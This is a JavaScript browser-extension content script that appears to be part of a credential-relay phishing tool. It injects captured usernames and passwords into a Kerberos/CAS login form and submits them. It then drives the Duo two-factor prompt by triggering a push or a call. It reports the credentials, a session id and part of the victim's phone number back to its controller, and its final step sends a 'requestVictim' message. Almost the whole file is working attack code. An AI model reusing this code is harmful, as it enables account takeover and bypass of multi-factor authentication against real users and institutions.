// var USER; var PASS; injected

function injectCreds() {
	var usr = document.getElementsByName("j_username")[0];
	var pass = document.getElementsByName("j_password")[0];
	var submitKerb = document.getElementsByName("Submit")[0];
	usr.value = USER
	pass.value = PASS
	submitKerb.click()
}

function openDUO() {
	var frame = document.getElementById("duo_iframe");
	window.open(frame.src);
}

function selectAuth(method) {
	var btns = document.getElementsByTagName("button");
	if (btns.length == 0) {
		setTimeout(selectAuth(method), 300);
		return;
	}
	var checkbox = document.getElementsByName("dampen_choice")[0];
	checkbox.checked = true;
	switch (method) {
		case "0": 
			// duo push
			btns[0].click();
			break;
		case "1": 
			// call me
			btns[1].click();
			break;
	}
	setTimeout(function() {checkAuthSucc()}, 500);
}

function checkAuthSucc() {
	var messages = document.getElementsByClassName("message-text");
	var succ = false;
	for (var i = 0; i < messages.length; i++) {
		var m = messages[i].innerHTML;
		if (m.includes("Success")) {
			window.localStorage.setItem("loggedIn", "true");
			browser.runtime.sendMessage({
				"status": "loggedIn", 
				"sid" 	: SID,
				"user"	: USER,
				"pass"	: PASS
			});
			succ = true;
		}
		if (m.includes("Answered") && window.callAnswered == undefined) {
			window.callAnswered = true;
			browser.runtime.sendMessage({"status": "callAnswered", "sid":SID});
		}
	}
	
	if (succ == false) {
		setTimeout(function(){checkAuthSucc()}, 500);
	}
}

function validCreds() {
	return (document.getElementsByTagName("iframe").length != 0) 	
}

if (window.location.href.endsWith("UsernamePassword")) {
	if (validCreds()) {
		openDUO();
		browser.runtime.sendMessage({"status": "validCreds", "sid":SID});
	}
	else {
		browser.runtime.sendMessage({"status": "invalidCreds", "sid":SID});
		browser.runtime.sendMessage({"local": "removeTab"});
	}
}
else if (window.location.href.includes("duosecurity.com")) {
	if (window.localStorage.getItem("loggedIn") != "true") {
		var num; 
		try {
			num = document.getElementsByName("device")[0].innerHTML.split("(")[1].substring(0, 12);
		}
		catch(e){}
		if (num != undefined)
			browser.runtime.sendMessage({"status": "waitingForAuthm", "number":num, "sid":SID});
		else
			browser.runtime.sendMessage({"status": "waitingForAuthm", "sid":SID});
		// wait for received message
		browser.runtime.onMessage.addListener(function(msg) {
			if (msg["status"] == "selected") {
				browser.runtime.sendMessage({"status":"authing...", "sid":SID});
				selectAuth(msg.method);
			}
			if (msg["action"] == "cancelPressed") {
				try {
					document.getElementsByClassName("btn-cancel")[0].click();
				}
				catch(e){}
			}
			if (msg["action"] == "closeTab") {
				browser.runtime.sendMessage({"local": "removeTab"});
			}
		});
	}
}
else {
	injectCreds();
	//browser.runtime.sendMessage({"local":"requestSock", "sid":SID});
	browser.runtime.sendMessage({"action":"requestVictim", "sid":SID});
}
